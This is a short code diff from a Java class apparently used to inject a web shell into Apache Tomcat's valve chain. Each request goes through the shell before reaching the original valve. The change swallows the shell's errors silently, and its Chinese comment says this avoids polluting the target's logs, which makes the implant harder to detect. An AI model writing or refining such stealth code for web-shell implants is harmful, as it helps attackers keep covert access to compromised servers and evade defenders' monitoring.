@@ -61,8 +61,8 @@ public class TomcatProxyValveInjector implements InvocationHandler {
             try {
                 // 先让 shell 处理请求，再转发给原始 valve
                 method.invoke(proxyValve, args);
-            } catch (Throwable e) {
-                e.printStackTrace();
+            } catch (Throwable ignored) {
+                // Shell 处理失败仍继续原始 Valve 链，不污染目标日志。
             }
             return method.invoke(rawValve, args);
         }
